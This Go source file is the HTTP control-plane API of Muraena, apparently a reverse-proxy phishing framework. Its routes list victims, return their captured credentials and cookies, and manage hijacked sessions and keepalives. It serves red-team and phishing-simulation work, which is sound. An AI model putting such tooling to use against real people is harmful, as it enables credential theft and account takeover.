package api

import (
	"fmt"
	"net/http"

	"github.com/go-chi/chi/v5"

	"github.com/muraenateam/muraena/api/auth"
	"github.com/muraenateam/muraena/api/logstream"
	"github.com/muraenateam/muraena/api/recon"
	"github.com/muraenateam/muraena/api/traffic"
	"github.com/muraenateam/muraena/core"
	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/session"
	"github.com/muraenateam/muraena/webui"
)

type Server struct {
	sess     *session.Session
	hub      *traffic.Hub
	recon    *recon.Runner
	reconHub *recon.ProgHub
	logHub   *logstream.Hub
	logCh    chan log.LogLine
}

func New(sess *session.Session) *Server {
	s := &Server{
		sess:     sess,
		hub:      traffic.NewHub(),
		recon:    recon.NewRunner(),
		reconHub: recon.NewProgHub(),
		logHub:   logstream.NewHub(),
		logCh:    make(chan log.LogLine, 256),
	}
	go s.reconHub.Run()
	// Note: the log tap and its Redis-backed consumer are wired up in Run(),
	// not here, mirroring traffic.StartConsumer below — both touch
	// session.RedisPool from a background goroutine and must not start until
	// the process is actually serving, so unit tests that call New() directly
	// (see newTestServer) never race a live consumer against a test's
	// short-lived Redis instance.
	return s
}

// startLogTap registers the package-level log tap and starts the Redis ring
// + hub consumer. Only called from Run(); see the note in New().
func (s *Server) startLogTap() {
	go s.logHub.Run()
	go s.consumeLogTap()
	log.RegisterTap("api", func(l log.LogLine) {
		// Non-blocking: fires under log.lock, so a full/slow consumer must
		// never stall logging. Drop the line instead of blocking.
		select {
		case s.logCh <- l:
		default:
		}
	})
}

// consumeLogTap drains the tap channel and fans each line out to the Redis
// ring and connected WS clients. Runs for the lifetime of the process. The
// per-line work is wrapped in a recover: this goroutine outlives any single
// request and must never take the process down (e.g. a backing store that
// is briefly unreachable), matching the "never stall/never crash the app on
// a log line" spirit of the tap itself.
func (s *Server) consumeLogTap() {
	for l := range s.logCh {
		func() {
			defer func() { _ = recover() }()
			maxLines := s.sess.Config().Api.Logs.MaxLines
			if maxLines <= 0 {
				maxLines = 512
			}
			if err := logstream.Append(l, maxLines); err != nil {
				return
			}
			s.logHub.Broadcast(l)
		}()
	}
}

func (s *Server) Router() http.Handler {
	r := chi.NewRouter()
	r.Use(RequestID, Recover)

	r.Route("/api/v1", func(r chi.Router) {
		r.Get("/healthz", func(w http.ResponseWriter, _ *http.Request) {
			writeJSON(w, 200, map[string]string{"status": "ok", "version": core.Version})
		})

		r.Post("/auth/login", s.handleLogin)
		r.Post("/auth/refresh", s.handleRefresh)

		// WS traffic route authenticates itself via ?token= (browsers cannot set
		// an Authorization header on a WebSocket upgrade), so it must be mounted
		// outside RequireAuth to avoid rejecting the header-less upgrade request.
		r.Get("/ws/traffic", s.handleTrafficWS)

		// WS recon progress route authenticates via ?token= for the same reason
		// as /ws/traffic, so it must sit outside RequireAuth.
		r.Get("/ws/recon", s.handleReconWS)

		// WS logs route authenticates via ?token= for the same reason as
		// /ws/traffic and /ws/recon, so it must sit outside RequireAuth.
		r.Get("/ws/logs", s.handleLogsWS)

		r.Group(func(r chi.Router) {
			r.Use(RequireAuth())
			r.Post("/auth/logout", s.handleLogout)
			r.Get("/me", s.handleMe)

			r.Get("/victims", s.handleListVictims)
			r.Get("/victims/{id}", s.handleGetVictim)
			r.Get("/victims/{id}/credentials", s.handleVictimCredentials)
			r.Get("/victims/{id}/cookies", s.handleVictimCookies)
			r.Get("/sessions/hijacked", s.handleHijacked)
			r.Get("/sessions/instrumented", s.handleInstrumented)
			r.Get("/keepalives", s.handleListKeepalives)

			r.Get("/traffic", s.handleListTraffic)
			r.Get("/traffic/stats", s.handleTrafficStats)
			r.Get("/traffic/{id}", s.handleGetTraffic)

			r.Get("/logs", s.handleListLogs)
		})

		r.Group(func(r chi.Router) {
			r.Use(RequireAuth("admin"))
			r.Get("/users", s.handleListUsers)
			r.Post("/users", s.handleCreateUser)
			r.Delete("/users/{name}", s.handleDeleteUser)
			r.Get("/settings", s.handleGetSettings)
			r.Put("/settings", s.handlePutSettings)
			r.Get("/config", s.handleGetConfig)
			r.Patch("/config", s.handlePatchConfig)
			r.Post("/config/reload", s.handleReloadConfig)
			r.Post("/config/import", s.handleImportConfig)
			r.Get("/config/restart-fields", s.handleRestartFields)

			r.Delete("/victims/{id}", s.handleDeleteVictim)
			r.Post("/victims/{id}/instrument", s.handleForceInstrument)

			r.Post("/keepalives", s.handleCreateKeepalive)
			r.Delete("/keepalives/{id}", s.handleDeleteKeepalive)
			r.Post("/victims/{id}/keepalive", s.handleKeepaliveNow)

			r.Delete("/traffic", s.handleClearTraffic)

			r.Post("/recon", s.handleStartRecon)
			r.Get("/recon/{id}", s.handleGetRecon)
			r.Post("/recon/{id}/apply", s.handleApplyRecon)
		})
	})

	// Serve the embedded WebUI at the root (localhost only).
	r.Handle("/*", webui.Handler())
	return r
}

// Run starts the API server. No-op when the API is disabled.
func Run(sess *session.Session) {
	if !sess.Config().Api.Enable {
		log.Debug("API control plane disabled")
		return
	}
	if err := auth.Bootstrap(); err != nil {
		log.Error("API bootstrap failed: %s", err)
		return
	}
	srv := New(sess)
	// Always start the hub + consumer, regardless of the boot-time
	// Api.Traffic.Enable value: Api.Traffic.Enable is hot-swappable at
	// runtime (see commit c722060) and the proxy tap checks it per-request,
	// so flows can start arriving at any time. The /ws/traffic route is also
	// registered unconditionally, so a client can authenticate and call
	// s.hub.Register() at any time; hub.Run() must already be draining the
	// (unbuffered) register channel or that call blocks forever, leaking the
	// handler goroutine, its reader goroutine, and the socket. Both loops are
	// idle-cheap when capture is off: StartConsumer blocks on the empty
	// capture.Flows() channel and hub.Run() blocks on an empty select.
	go srv.hub.Run()
	go traffic.StartConsumer(sess, srv.hub)
	srv.startLogTap()
	addr := fmt.Sprintf("%s:%d", sess.Config().Api.Bind, sess.Config().Api.Port)
	log.Info("API control plane listening on %s", addr)
	if err := http.ListenAndServe(addr, srv.Router()); err != nil {
		log.Error("API server error: %s", err)
	}
}
